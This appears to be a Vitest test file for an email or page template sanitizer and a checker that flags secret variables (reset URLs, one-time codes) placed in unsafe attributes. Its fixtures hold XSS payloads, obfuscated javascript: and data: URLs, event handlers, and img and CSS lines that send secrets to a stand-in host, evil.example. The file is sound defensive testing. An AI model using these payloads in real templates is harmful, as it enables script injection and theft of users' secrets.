import { describe, expect, it } from 'vitest';

import { cleanTemplateHtml, findMisplacedSecrets } from '../sanitize';

describe('cleanTemplateHtml', () => {
  it('strips script, iframe, object, embed, form, base, meta, link and style elements and on* attributes', () => {
    const html = [
      '<base href="https://evil.example/">',
      '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
      '<link rel="stylesheet" href="https://evil.example/a.css">',
      '<style>p { color: red }</style>',
      '<script>alert(1)</script>',
      '<iframe src="https://evil.example/"></iframe>',
      '<object data="https://evil.example/x"></object>',
      '<embed src="https://evil.example/x">',
      '<form action="https://evil.example/"><input name="q">Kept text</form>',
      '<p onclick="steal()" onmouseover=\'steal()\' class="note">Hello {{ user.name }}</p>',
      '<img src="https://example.com/logo.png" onerror="steal()" alt="Logo">',
    ].join('\n');

    const cleaned = cleanTemplateHtml(html);

    for (const forbidden of [
      '<base',
      '<meta',
      '<link',
      '<style',
      '<script',
      '<iframe',
      '<object',
      '<embed',
      '<form',
      '<input',
      'alert(1)',
      'color: red',
      'evil.example',
      'onclick',
      'onmouseover',
      'onerror',
    ]) {
      expect(cleaned).not.toContain(forbidden);
    }

    expect(cleaned).toContain('Kept text');
    expect(cleaned).toContain('<p class="note">Hello {{ user.name }}</p>');
    expect(cleaned).toContain('<img src="https://example.com/logo.png" alt="Logo">');
  });

  it('drops javascript: and data: URLs and keeps http, https and mailto', () => {
    const cleaned = cleanTemplateHtml(
      [
        '<a href="javascript:alert(1)">a</a>',
        '<a href=" JaVa\tScRiPt:alert(1)">b</a>',
        '<a href="&#106;avascript:alert(1)">c</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD4=">d</a>',
        '<img src="data:image/png;base64,AAAA">',
        '<a href="http://example.com/a">e</a>',
        '<a href="https://example.com/b">f</a>',
        '<a href="mailto:help@example.com">g</a>',
        '<a href="{{ url }}">h</a>',
      ].join('\n'),
      ['url']
    );

    expect(cleaned).not.toMatch(/javascript/i);
    expect(cleaned).not.toContain('data:');
    expect(cleaned).toContain('<a href="http://example.com/a">e</a>');
    expect(cleaned).toContain('<a href="https://example.com/b">f</a>');
    expect(cleaned).toContain('<a href="mailto:help@example.com">g</a>');
    expect(cleaned).toContain('<a href="{{ url }}">h</a>');
  });

  it('keeps a leading placeholder in href and src only for a declared link variable', () => {
    const html = '<a href="{{ url }}">a</a><img src="{{ logo }}"><a href="{{ name }}">b</a>';

    expect(cleanTemplateHtml(html, ['url', 'logo'])).toBe(
      '<a href="{{ url }}">a</a><img src="{{ logo }}"><a href>b</a>'
    );
    expect(cleanTemplateHtml(html)).toBe('<a href>a</a><img src><a href>b</a>');
  });

  it('decodes an entity-encoded placeholder in an attribute', () => {
    expect(cleanTemplateHtml('<a title="&#123;&#123; url &#125;&#125;">x</a>')).toBe(
      '<a title="{{ url }}">x</a>'
    );
  });

  it('drops style values that load a resource', () => {
    const cleaned = cleanTemplateHtml(
      '<p style="background:url(https://evil.example/pixel)">a</p><p style="color: #333">b</p>'
    );

    expect(cleaned).not.toContain('evil.example');
    expect(cleaned).toContain('<p style="color:#333;">b</p>');
  });
});

describe('findMisplacedSecrets', () => {
  const secrets = ['url', 'otp'];

  it('refuses a secret variable in an img src, a style or any attribute but an a href', () => {
    expect(findMisplacedSecrets('<img src="{{ url }}">', secrets)).toEqual(['url']);
    expect(findMisplacedSecrets('<img src="https://evil.example/?t={{url}}">', secrets)).toEqual([
      'url',
    ]);
    expect(findMisplacedSecrets('<p style="background:url({{ url }})">x</p>', secrets)).toEqual([
      'url',
    ]);
    expect(findMisplacedSecrets('<span title="{{ otp }}">x</span>', secrets)).toEqual(['otp']);
    expect(findMisplacedSecrets('<img srcset="{{ url }} 2x">', secrets)).toEqual(['url']);
    expect(findMisplacedSecrets('<img {{ url }}>', secrets)).toEqual(['url']);
    expect(findMisplacedSecrets('<a href="#" title="{{ url }}">x</a>', secrets)).toEqual(['url']);
    expect(findMisplacedSecrets('<a title="href=\'{{ url }}\'" href="#">x</a>', secrets)).toEqual([
      'url',
    ]);
    expect(findMisplacedSecrets('<a href="{{ url }}"><img src="{{ otp }}"></a>', secrets)).toEqual([
      'otp',
    ]);
  });

  it('finds a placeholder written with entities, unquoted or in upper case', () => {
    expect(findMisplacedSecrets('<img src={{url}}>', secrets)).toEqual(['url']);
    expect(findMisplacedSecrets('<IMG SRC="{{ url }}">', secrets)).toEqual(['url']);
    expect(
      findMisplacedSecrets(
        '<img src="https://e.example/?t=&#123;&#123; url &#125;&#125;">',
        secrets
      )
    ).toEqual(['url']);
    expect(
      findMisplacedSecrets('<span title="&#x7B;&#x7B; otp &#x7D;&#x7D;">x</span>', secrets)
    ).toEqual(['otp']);
  });

  it('accepts a secret variable in text and in an a href', () => {
    expect(findMisplacedSecrets('<p>Your code is {{ otp }}</p>', secrets)).toEqual([]);
    expect(findMisplacedSecrets('<p><a href="{{ url }}">Reset</a> {{ url }}</p>', secrets)).toEqual(
      []
    );
    expect(findMisplacedSecrets('<A HREF=\'{{url}}\' target="_blank">x</A>', secrets)).toEqual([]);
  });

  it('ignores variables that are not secret and templates without secrets', () => {
    expect(findMisplacedSecrets('<img src="{{ logo }}">', secrets)).toEqual([]);
    expect(findMisplacedSecrets('<img src="{{ url }}">', [])).toEqual([]);
  });
});
